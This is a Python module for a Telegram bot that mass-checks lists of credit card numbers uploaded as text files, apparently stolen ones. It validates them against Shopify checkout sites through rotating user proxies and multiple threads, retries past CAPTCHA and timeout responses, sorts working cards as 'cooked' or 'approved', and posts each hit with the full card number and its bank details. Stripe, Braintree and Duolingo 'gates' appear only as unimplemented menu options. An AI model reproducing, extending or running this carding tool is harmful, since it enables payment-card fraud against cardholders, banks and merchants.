import os
import json
import re
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from telebot import types

def setup_complete_handler(
    bot,
    get_filtered_sites_func,
    proxies_data,
    check_site_func,
    is_valid_response_func,
    process_response_func,
    update_stats_func,
    save_json_func,
    is_user_allowed_func,
    OWNER_ID,
    DARKS_ID,
    user_proxies_store,
    USER_PROXIES_FILE,
    # Additional required functions from app.py
    extract_cards_from_text,
    validate_proxies_strict,
    get_bin_info,
    create_progress_bar
):
    """
    Sets up additional handlers:
      - File upload (CCs or proxies)
      - Proxy management commands for users
      - Mass check callbacks with filter selection
    """

    # Helper: check if user is allowed
    def user_allowed(uid):
        return uid in OWNER_ID or is_user_allowed_func(uid)

    # ------------------------------------------------------------------------
    # Proxy management commands
    # ------------------------------------------------------------------------
    @bot.message_handler(commands=['addproxy'])
    def cmd_addproxy(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /addproxy ip:port OR ip:port:user:pass")
            return
        proxy = args[1].strip()
        parts = proxy.split(':')
        if len(parts) not in (2, 4):
            bot.reply_to(message, "❌ Invalid format. Use ip:port or ip:port:user:pass")
            return
        uid = str(message.from_user.id)
        if uid not in user_proxies_store:
            user_proxies_store[uid] = []
        if proxy not in user_proxies_store[uid]:
            user_proxies_store[uid].append(proxy)
            save_json_func(USER_PROXIES_FILE, user_proxies_store)
            bot.reply_to(message, f"✅ Proxy added. Total: {len(user_proxies_store[uid])}")
        else:
            bot.reply_to(message, "⚠️ Proxy already in your list.")

    @bot.message_handler(commands=['myproxies'])
    def cmd_myproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        proxies = user_proxies_store.get(uid, [])
        if not proxies:
            bot.reply_to(message, "📭 You have no saved proxies.")
            return
        proxy_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(proxies)])
        bot.reply_to(message, f"🔌 Your proxies:\n{proxy_list}")

    @bot.message_handler(commands=['clearproxies'])
    def cmd_clearproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        if uid in user_proxies_store and user_proxies_store[uid]:
            user_proxies_store[uid] = []
            save_json_func(USER_PROXIES_FILE, user_proxies_store)
            bot.reply_to(message, "✅ All your proxies cleared.")
        else:
            bot.reply_to(message, "📭 You have no proxies to clear.")

    # ==========================================================================
    # FILE UPLOAD HANDLER
    # ==========================================================================
    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            msg_loading = bot.reply_to(message, "⏳ <b>Reading File...</b>", parse_mode='HTML')

            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if ccs:
                if not hasattr(bot, 'user_sessions'):
                    bot.user_sessions = {}
                user_id = message.from_user.id
                bot.user_sessions[user_id] = {'ccs': ccs}

                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton("🛍️ Shopify Mass (Multi-Site)", callback_data="run_mass_shopify"),
                    types.InlineKeyboardButton("💳 Stripe Donation (Multi)", callback_data="run_mass_stripe_donation"),
                    types.InlineKeyboardButton("💰 Braintree Auth (bandc)", callback_data="run_mass_braintree_mass"),
                    types.InlineKeyboardButton("🔤 Duolingo Stripe Auth", callback_data="run_mass_duolingo_stripe"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                )

                bot.edit_message_text(
                    f"📂 <b>File:</b> <code>{file_name}</code>\n"
                    f"💳 <b>Cards:</b> {len(ccs)}\n"
                    f"<b>⚡ Select Checking Gate:</b>",
                    message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                )
            else:
                proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                if proxies:
                    user_id = message.from_user.id
                    uid = str(user_id)
                    if uid not in user_proxies_store:
                        user_proxies_store[uid] = []
                    added = 0
                    for p in proxies:
                        if p not in user_proxies_store[uid]:
                            user_proxies_store[uid].append(p)
                            added += 1
                    if added > 0:
                        save_json_func(USER_PROXIES_FILE, user_proxies_store)
                    bot.edit_message_text(
                        f"🔌 <b>Proxies Loaded:</b> {added} new (total {len(user_proxies_store[uid])})\n✅ You can now run Mass Check.",
                        message.chat.id, msg_loading.message_id, parse_mode='HTML'
                    )
                else:
                    bot.edit_message_text("❌ No valid CCs or Proxies found.", message.chat.id, msg_loading.message_id)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    # ==========================================================================
    # Helper: get active proxies for user
    # ==========================================================================
    def get_active_proxies_for_user(user_id, bot, message):
        uid = str(user_id)
        if hasattr(bot, 'user_sessions') and user_id in bot.user_sessions and 'proxies' in bot.user_sessions[user_id]:
            proxy_list = bot.user_sessions[user_id]['proxies']
        else:
            proxy_list = user_proxies_store.get(uid, [])
            if not proxy_list and user_id in OWNER_ID:
                proxy_list = proxies_data.get('proxies', [])

        if not proxy_list:
            bot.send_message(message.chat.id,
                             "🚫 <b>No Proxies Available!</b>\n"
                             "Add proxies via:\n"
                             "• Upload a .txt file\n"
                             "• /addproxy ip:port:user:pass",
                             parse_mode='HTML')
            return None

        live_proxies = validate_proxies_strict(proxy_list, bot, message)
        if not live_proxies:
            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b> Please add more.", parse_mode='HTML')
            return None
        return live_proxies

    # ==========================================================================
    # Improved hit message sender (includes owner mention)
    # ==========================================================================
    def send_hit_improved(bot, chat_id, res, title):
        try:
            cc = res['cc']
            bin_info = get_bin_info(cc)
            site_domain = res['site_url'].replace('https://', '').replace('http://', '').split('/')[0]

            bank_line = f"{bin_info.get('country_flag', '')} {bin_info.get('bank', 'UNKNOWN')}"
            card_line = f"{bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}"

            msg = (
                f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃   {title} HIT!\n"
                f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
                f"💳 <b>Card:</b> <code>{cc}</code>\n"
                f"📟 <b>Resp:</b> {res['response']}\n"
                f"💰 <b>Amt:</b> ${res['price']}\n"
                f"🌐 <b>Site:</b> {site_domain}\n"
                f"🔌 <b>Gate:</b> {res['gateway']}\n"
                f"🏦 <b>Bank:</b> {bank_line}\n"
                f"💳 <b>Type:</b> {card_line}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Owner:</b> <a href=\"tg://user?id={DARKS_ID}\">⏤‌‌Unknownop ꯭𖠌</a>"
            )
            bot.send_message(chat_id, msg, parse_mode='HTML')
        except Exception as e:
            bot.send_message(chat_id, f"{title}\n{res['cc']}\n{res['response']}")

    # ==========================================================================
    # Mass check engine with filter support
    # ==========================================================================
    MAX_RETRIES = 3

    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies,
                                  check_site_func, process_response_func, update_stats_func,
                                  hit_filter='both'):
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
        total = len(ccs)
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        def worker(cc):
            attempts = 0
            while attempts < MAX_RETRIES:
                try:
                    site = random.choice(sites)
                    proxy = random.choice(proxies)
                    api_response = check_site_func(site['url'], cc, proxy)

                    if not api_response:
                        attempts += 1
                        continue

                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))

                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
                        attempts += 1
                        continue

                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway,
                            'price': site.get('price', '0'), 'site_url': site['url']}
                except:
                    attempts += 1
            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown',
                    'price': '0', 'site_url': 'N/A'}

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(worker, cc): cc for cc in ccs}
            for future in as_completed(futures):
                processed += 1
                res = future.result()

                if res['status'] == 'APPROVED':
                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
                        res['final_status'] = 'COOKED'
                        results['cooked'].append(res)
                        update_stats_func('COOKED', True)
                        if hit_filter in ['cooked', 'both']:
                            send_hit_improved(bot, message.chat.id, res, "🔥 COOKED")
                    else:
                        res['final_status'] = 'APPROVED'
                        results['approved'].append(res)
                        update_stats_func('APPROVED', True)
                        if hit_filter in ['approved', 'both']:
                            send_hit_improved(bot, message.chat.id, res, "✅ APPROVED")
                elif res['status'] == 'APPROVED_OTP':
                    res['final_status'] = 'APPROVED_OTP'
                    results['approved'].append(res)
                    update_stats_func('APPROVED_OTP', True)
                    if hit_filter in ['approved', 'both']:
                        send_hit_improved(bot, message.chat.id, res, "⚠️ APPROVED (OTP)")
                elif res['status'] == 'DECLINED':
                    results['declined'].append(res)
                    update_stats_func('DECLINED', True)
                else:
                    results['error'].append(res)

                if time.time() - last_update_time > 3 or processed == total:
                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                    last_update_time = time.time()

        error_list = [f"{res['cc']} : {res['response']}" for res in results['error']]
        if error_list:
            error_file = f"error_cards_{message.from_user.id}.txt"
            with open(error_file, 'w') as f:
                f.write("\n".join(error_list))
            with open(error_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"⚠️ Error cards ({len(error_list)})")
            os.remove(error_file)

        duration = time.time() - start_time
        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)

    def update_ui(bot, chat_id, mid, processed, total, results):
        try:
            msg = f"""
┏━━━━━━━⍟
┃ <b>⚡ MASS CHECKING...</b>
┗━━━━━━━━━━━⊛
{create_progress_bar(processed, total)}
<b>Progress:</b> {processed}/{total}
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}
"""
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except:
            pass

    def send_final(bot, chat_id, mid, total, results, duration):
        msg = f"""
┏━━━━━━━⍟
┃ <b>✅ CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
<b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
"""
        try:
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except:
            bot.send_message(chat_id, msg, parse_mode='HTML')

    # ==========================================================================
    # Filter selection for Shopify
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify_filter(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if not hasattr(bot, 'user_sessions') or user_id not in bot.user_sessions or 'ccs' not in bot.user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies_for_user(user_id, bot, call.message)
            if proxies is None:
                return

            if not hasattr(bot, 'user_sessions'):
                bot.user_sessions = {}
            if user_id not in bot.user_sessions:
                bot.user_sessions[user_id] = {}
            bot.user_sessions[user_id]['temp_proxies'] = proxies

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_filter_cooked"),
                types.InlineKeyboardButton("✅ Approved Only", callback_data="shopify_filter_approved"),
                types.InlineKeyboardButton("Both", callback_data="shopify_filter_both")
            )
            bot.send_message(
                call.message.chat.id,
                "🔍 <b>Select which hits to display:</b>",
                reply_markup=markup,
                parse_mode='HTML'
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_filter_"))
    def callback_start_shopify_mass(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            filter_choice = call.data.replace("shopify_filter_", "")
            user_id = call.from_user.id

            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if not hasattr(bot, 'user_sessions') or user_id not in bot.user_sessions or 'ccs' not in bot.user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = bot.user_sessions[user_id].get('temp_proxies')
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxies missing. Please restart.")
                return

            del bot.user_sessions[user_id]['temp_proxies']

            start_msg = bot.send_message(
                call.message.chat.id,
                f"🔥 <b>Shopify Mass Check Started...</b>\n"
                f"💳 Cards: {len(bot.user_sessions[user_id]['ccs'])}\n"
                f"🔌 Proxies: {len(proxies)}\n"
                f"🎯 Filter: {filter_choice.upper()}",
                parse_mode='HTML'
            )

            process_mass_check_engine(
                bot, call.message, start_msg,
                bot.user_sessions[user_id]['ccs'],
                get_filtered_sites_func(),
                proxies,
                check_site_func,
                process_response_func,
                update_stats_func,
                hit_filter=filter_choice
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # ==========================================================================
    # Other mass check callbacks (placeholders – extend as needed)
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_donation")
    def callback_stripe_donation(call):
        bot.answer_callback_query(call.id, "Stripe donation mass check not yet implemented.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree_mass")
    def callback_braintree_mass(call):
        bot.answer_callback_query(call.id, "Braintree mass check not yet implemented.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_duolingo_stripe")
    def callback_duolingo_stripe(call):
        bot.answer_callback_query(call.id, "Duolingo mass check not yet implemented.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    return
